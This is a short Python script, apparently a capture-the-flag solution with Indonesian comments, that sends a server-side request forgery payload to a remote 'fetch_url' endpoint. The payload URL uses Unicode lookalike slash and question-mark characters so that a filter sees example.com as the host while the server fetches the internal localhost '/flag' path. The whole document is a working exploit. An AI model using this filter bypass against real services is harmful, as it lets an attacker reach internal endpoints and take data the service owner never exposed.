import requests

# URL endpoint
endpoint = "http://68.183.177.211:20002/fetch_url"  # Pastikan URL ini benar, sesuai dengan host server Anda

# URL yang ingin di-fetch
url_to_fetch = "http://127.0.0.1:20002⁄flag﹖@example.com"  # Gantilah dengan URL yang ingin Anda request

# Membuat request ke endpoint dengan URL sebagai parameter
try:
    response = requests.get(endpoint, params={'url': url_to_fetch})
    if response.status_code == 200:
        print("Content-Type:", response.headers['Content-Type'])
        print("Response Content:", response.text)
    else:
        print(f"Failed to fetch URL. Status code: {response.status_code}")
        print("Error message:", response.text)
except requests.exceptions.RequestException as e:
    print("An error occurred:", e)